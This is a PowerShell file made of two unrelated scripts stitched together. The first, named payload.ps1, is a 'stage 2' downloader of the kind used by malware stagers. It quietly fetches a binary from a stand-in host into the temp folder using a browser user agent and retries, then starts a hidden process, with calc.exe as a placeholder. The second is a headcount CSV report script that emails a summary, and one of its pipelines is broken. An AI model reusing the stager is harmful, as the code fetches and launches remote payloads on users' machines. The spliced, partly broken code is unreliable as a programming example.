
<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://example.org/cdn/stage2.bin',
    [string]$WorkingPath = "$env:TEMP\stage1.bin",
    [string]$TracePath = "$env:TEMP\telemetry.json",
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$RequestTimeout = 161,
    [int]$RetryAttempts = 2,
    [int]$BackoffSeconds = 8
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $TracePath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$RetryCount = 2,
        [int]$RetryDelay = 8,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $TransferUrl
    $TransferResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $WorkingPath -RetryCount $RetryAttempts -RetryDelay $BackoffSeconds -UserAgent $BrowserAgent
    if ($TransferResult) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath "calc.exe" -WindowStyle Hidden
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $TransferUrl
    Destination = $WorkingPath
    RetryCount = $RetryAttempts
    TimeoutSec = $RequestTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Collecting host metadata"
Write-Verbose "Resolving configured target"
Write-Verbose "Validating result"
Write-Verbose "Checking local path"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Exporting operation report"
Write-Verbose "Starting workflow"
Write-Verbose "Writing diagnostic marker"
Start-Sleep -Seconds 40
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
#Requires -Version 5.1
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InputCsv = 'C:\Data\exports\headcount.csv',
    [string]$OutputPath = "C:\Reports\headcount-summary-2025-11-01.csv",

    [Parameter(Mandatory = $false)]
    [ValidateSet('Department', "Site")]
    [string]$GroupBy = 'Department',
    [double]$MinAmount = 2500
)

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$culture = [System.Globalization.CultureInfo]::InvariantCulture
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ","
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}
$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending |
    -NoTypeInformation `
    -Path $OutputPath

$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8
$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize
$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$style = @'
<style>
body { font-family: Arial; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8

$jsonBody = $byGroup | ConvertTo-Json -Depth 4
$jsonBody | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = 'reporting@adatum.com'
$MailFrom = "bi@adatum.com"
$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = 'Headcount summary'
    Body       = $summaryBody
    SmtpServer = 'smtp.adatum.com'
    Port       = 587
    UseSsl     = $true
}
Send-MailMessage @mailParams

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)
